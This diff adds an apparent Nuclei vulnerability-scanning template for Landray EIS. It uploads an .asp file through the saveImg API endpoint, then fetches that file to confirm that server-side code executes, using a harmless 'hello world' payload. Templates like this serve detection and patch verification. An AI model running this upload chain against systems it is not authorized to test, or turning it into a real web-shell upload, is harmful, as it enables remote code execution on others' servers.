@@ -1,0 +1,53 @@
+id: landray-eis-saveImg-upload
+
+info:
+  name: landray-eis-saveImg-upload
+  author: landray-eis-saveImg-upload
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(16)}}"
+
+http:
+  - raw:
+      - |
+        POST /eis/service/api.aspx?action=saveImg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Connection: close
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+        Content-Length: 208
+        
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="file"filename="{{filename}}.asp"
+        Content-Type: text/html
+        
+        <% response.write("hello world")%>
+        ------WebKitFormBoundary{{boundary}}--
+
+      - |
+        GET /files/editor_img/{{aspfilenammme}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+    
+
+    extractors:
+      - type: regex
+        part: body
+        name: aspfilenammme
+        group: 1
+        internal: true
+        regex:
+          - '/files/editor_img/([0-9-a-z]+/\w+\.asp)' 
+
+        
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body_1,"editor_img") && contains(body_2,"hello world")'
